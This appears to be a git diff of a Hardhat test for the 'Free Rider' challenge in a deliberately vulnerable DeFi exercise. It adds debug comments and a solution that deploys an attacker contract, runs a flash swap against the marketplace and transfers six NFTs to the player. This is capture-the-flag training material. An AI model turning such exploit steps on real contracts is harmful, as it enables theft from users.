@@ -87,7 +87,16 @@ describe('[Challenge] Free Rider', function () {
         for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
             expect(await nft.ownerOf(id)).to.be.eq(deployer.address);
         }
+
+        // for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
+        //     console.log('Approved address', await nft.getApproved(id));
+        // }
+
         await nft.setApprovalForAll(marketplace.address, true);
+
+        // for (let id = 0; id < AMOUNT_OF_NFTS; id++) {
+        //     console.log('Approved address', await nft.getApproved(id));
+        // }
 
         // Open offers in the marketplace
         await marketplace.offerMany(
@@ -106,6 +115,20 @@ describe('[Challenge] Free Rider', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const FreeRider = await ethers.getContractFactory("FreeRider");
+        const freeRider = await FreeRider.deploy(
+            uniswapPair.address,
+            marketplace.address,
+            devsContract.address,
+            weth.address,
+            nft.address,
+            player.address,
+            { value: ethers.utils.parseEther("0.05") }
+        );
+        await freeRider.flashSwap();
+        for (i = 0; i < 6; i++) {
+            await freeRider.connect(player).transferNft(i);
+        }
     });
 
     after(async function () {
